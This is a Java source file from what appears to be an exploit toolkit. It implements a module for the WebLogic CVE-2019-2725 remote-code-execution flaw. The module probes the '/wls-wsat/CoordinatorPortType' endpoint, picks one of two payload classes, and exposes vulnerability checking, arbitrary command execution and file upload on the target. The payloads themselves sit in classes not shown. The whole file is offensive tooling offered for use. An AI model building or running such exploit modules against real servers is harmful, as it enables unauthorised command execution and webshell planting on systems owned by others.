package fun.fireline.exp.oracle.weblogic;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.util.HashMap;

/**
 * @author yhy
 * @date 2021/8/21 21:25
 * @github https://github.com/yhy0
 *
 * CVE-2019-2725 Weblogic12
 */

public class CVE_2019_2725_12 implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    public ExploitInterface getPayload(String url)  {
        this.target = url;
        this.headers.put("Content-type", "text/xml");
        ExploitInterface ei;

        Response response = HttpTools.get(url + "/wls-wsat/CoordinatorPortType", this.headers, "UTF-8");

        if (response.getText().indexOf("schemas.xmlsoap.org") != -1) {
            ei = new CVE_2019_2725_12_1(url);
        } else {
            ei = new CVE_2019_2725_12_2(url);
        }
        return ei;
    }


    @Override
    public String checkVul(String url) {
        return this.getPayload(url).checkVul(url);
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        return this.getPayload(this.target).exeCmd(cmd, encoding);
    }

    @Override
    public String getWebPath() {
        return this.getPayload(this.target).getWebPath();
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        return this.getPayload(this.target).uploadFile(this.target, fileContent, filename);
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
